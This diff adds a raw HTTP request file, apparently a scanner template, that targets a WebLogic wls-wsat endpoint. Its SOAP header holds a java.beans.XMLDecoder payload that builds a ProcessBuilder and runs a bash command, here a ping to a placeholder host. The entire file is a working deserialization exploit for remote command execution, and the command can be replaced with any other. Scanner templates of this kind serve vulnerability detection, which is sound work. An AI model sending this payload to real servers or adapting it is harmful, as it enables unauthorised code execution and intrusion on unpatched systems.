@@ -1,0 +1,29 @@
+POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: localhost:7001
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Content-Type: text/xml
+Content-Length: 630
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java version="1.4.0" class="java.beans.XMLDecoder">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>ping this-text-will-automatically-change</string>
+</void>
+</array>
+<void method="start"/></void>
+</java>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body/>
+</soapenv:Envelope>
